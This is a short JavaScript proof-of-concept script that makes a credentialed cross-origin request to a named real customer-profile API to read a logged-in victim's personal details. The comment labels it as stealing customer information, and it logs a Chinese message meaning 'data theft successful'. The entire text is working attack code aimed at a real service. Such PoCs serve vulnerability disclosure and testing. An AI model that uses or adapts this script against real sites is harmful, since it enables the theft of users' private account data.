//steal the customer's information
var steal = new XMLHttpRequest();
steal.open('get', 'https://profile.starbucks.com.cn/api/Customers/detail');
steal.withCredentials = true;
steal.send();
steal.onreadystatechange = function () {
      if (steal.readyState == 4 && steal.status == 200) {
            console.log('数据偷取成功');
            alert(steal.responseText);
    }
}

